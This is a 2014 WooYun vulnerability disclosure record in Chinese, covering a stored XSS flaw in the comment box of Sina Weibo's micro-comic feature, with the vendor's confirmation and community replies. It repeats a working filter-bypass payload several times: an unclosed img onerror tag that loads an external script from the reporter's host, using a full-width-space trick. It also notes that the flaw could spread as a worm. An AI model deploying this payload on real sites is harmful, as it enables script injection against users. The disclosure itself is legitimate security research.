{"id": 5438, "wybug_id": "wooyun-2014-050086", "wybug_title": "新浪微博微漫画存储型xss漏洞(xss filter bypass)", "wybug_corp": "新浪", "wybug_author": "q601333824", "wybug_date": "2014-01-30 11:55", "wybug_open_date": "2014-03-16 11:55", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-16：\t细节向公众公开  简要描述： 新浪微博微漫画存储型xss漏洞 详细说明：        1.新浪微博微漫画评论框处的存储型XSS漏洞，虽然经过过滤，但是可以绕过过滤       (用了最后的必杀技了)      2.插入一段不闭合的代码标签：      <img/src=\"#\"/onerror=\"var　e=document.createElement('script');e.setAttribute('src','http://q601333824.duapp.com/?r='+Math.random()*99999999);document.body.appendChild(e)\"       3.为了对比过滤的效果，我准备了两段代码进行对比，下面两段      (1)XSS测试代码1号：<img/src=\"#\"/onerror=\"var　e=document.createElement('script');e.setAttribute('src','http://q601333824.duapp.com/?r='+Math.random()*99999999);document.body.appendChild(e)\">      (2)XSS测试代码2号：<img/src=\"#\"/onerror=\"var　e=document.createElement('script');e.setAttribute('src','http://q601333824.duapp.com/?r='+Math.random()*99999999);document.body.appendChild(e)\"    (这两段代码，不一样的地方就是第一段代码进行了闭合，第二段没有进行闭合)      4.插入回复评论处:，如图\n\n      5.然后回复之后，两段代码产生的标签进行对比,如图 \n\n    （XSS测试代码1号过滤的连渣都不剩下，但是XSS测试代码2号并没有被过滤）     6.当目标用户阅读漫画的时候就可以触发XSS,如图 \n\n \n\n     7.如果审核的人测试，还有个注意点就是，插入外部JS的时候     要在声明变量之间打上全角空格     比如 var　e 直接打上全角角空格,如果不打全角空格，直接打空格，会出现下面这张图片的状况,如图 \n\n      (插入外部JS，声明变量的时候一定要全角空格)     8.我没干啥坏事，附上一张我存在BAE代码图片...=_=     只有一段弹窗代码，没有加别的=_= \n\n     漏洞证明：       1.插入一段不闭合标签的代码加载外部JS代码      <img/src=\"#\"/onerror=\"var　e=document.createElement('script');e.setAttribute('src','http://q601333824.duapp.com/?r='+Math.random()*99999999);document.body.appendChild(e)\"    2.插入评论框 \n\n    3.XSS过滤对比图 \n\n  （XSS测试代码1号过滤的连渣都不剩下，但是XSS测试代码2号并没有被过滤）    4. \n\n \n\n   5. 7.如果审核的人测试，还有个注意点就是，插入外部JS的时候     要在声明变量之间打上全角空格     比如 var　e 直接打上全角角空格,如果不打全角空格，直接打空格，会出现下面这张图片的状况,如图 \n\n   修复方案：    1. 检查并对尖括号自动配对，   2. 危害程度就是这里的评论是和新浪微博同步的，如果一个人中了代码发到微博，另一个人再访问，又中了再发微博，虽然有httponly拿不到cook,但是可以进行蠕虫,可加载外部JS代码   版权声明：转载请注明来源 q601333824@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-01-31 23:23 厂商回复： 感谢关注新浪安全，祝洞主新年快乐 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-30 12:30 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  难道又是那个self-xss    \n     2014-01-30 16:26 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  过年了还提漏洞 有人确认么？    \n     2014-01-31 15:18 |    \t\t动后河 \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:13        | ☭)\t\t \n  洞主有没有钓大v    \n     2014-02-02 05:01 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:217 漏洞数:49        | 出自《丹特丽安的书架》---吾问汝,汝为人否...)\t\t \n  @动后河 什么也没干.....=-=    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}